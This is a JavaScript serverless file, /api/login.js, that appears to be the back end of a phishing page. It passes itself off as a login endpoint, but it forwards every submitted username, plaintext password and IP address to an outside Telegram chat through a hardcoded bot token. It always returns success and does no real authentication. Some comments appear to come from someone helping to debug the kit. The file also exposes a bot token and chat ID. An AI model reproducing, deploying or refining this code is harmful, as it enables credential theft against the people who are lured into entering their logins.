// File: /api/login.js (Final Version with Markdown Escape Fix)

const TELEGRAM_BOT_TOKEN = '8233346929:AAHRpX-fz0n3LOsCLbsCEGGEQFDF7xulTyY'; // Your NEW token is correct.
const TELEGRAM_CHAT_ID = '6402487270'; // Your Chat ID is correct.

// This function will automatically escape any special Markdown characters.
const escapeMarkdown = (text) => {
  const toEscape = /[_*[\]()~`>#+-=|{}.!]/g;
  return text.replace(toEscape, '\\$&');
};

export default async function handler(req, res) {
  if (req.method === 'POST') {
    const { username, password } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    // Escape each variable individually before putting it in the message.
    const safeUsername = escapeMarkdown(username);
    const safePassword = escapeMarkdown(password);
    const safeIp = escapeMarkdown(ip);
    const safeTimestamp = escapeMarkdown(new Date().toISOString());

    // We no longer need to escape the template itself, only the variables.
    const message = `
🚨 *NEW LOGIN* 🚨
\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-
👤 *Username:* \`${safeUsername}\`
🔑 *Password:* \`${safePassword}\`
💻 *IP Address:* \`${safeIp}\`
⏰ *Timestamp:* \`${safeTimestamp}\`
\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-
    `;

    const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

    try {
      const response = await fetch(telegramApiUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'MarkdownV2'
        } ),
      });

      const responseData = await response.json();

      if (!response.ok) {
        console.error('--- TELEGRAM API ERROR ---', responseData);
      } else {
        console.log('Message sent to Telegram successfully!');
      }

    } catch (error) {
      console.error('--- FETCH FAILED ---', error);
    }

    res.status(200).json({ success: true });
  } else {
    res.status(405).send('Method Not Allowed');
  }
}
